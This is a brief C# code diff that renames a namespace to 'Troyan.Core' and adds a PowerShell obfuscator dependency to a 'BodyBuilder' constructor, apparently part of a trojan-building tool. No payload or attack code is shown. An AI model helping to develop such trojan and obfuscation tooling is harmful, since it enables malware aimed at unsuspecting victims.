@@ -1,8 +1,8 @@
-namespace TroyanBuilder;
+namespace Troyan.Core;
 
 public sealed class BodyBuilder : CustomBuilder
 {
-    public BodyBuilder(TroyanBuildMode mode) : base(mode)
+    public BodyBuilder(TroyanBuildMode mode, IPowerShellObfuscator obfuscator) : base(mode, obfuscator)
     {
     }
 
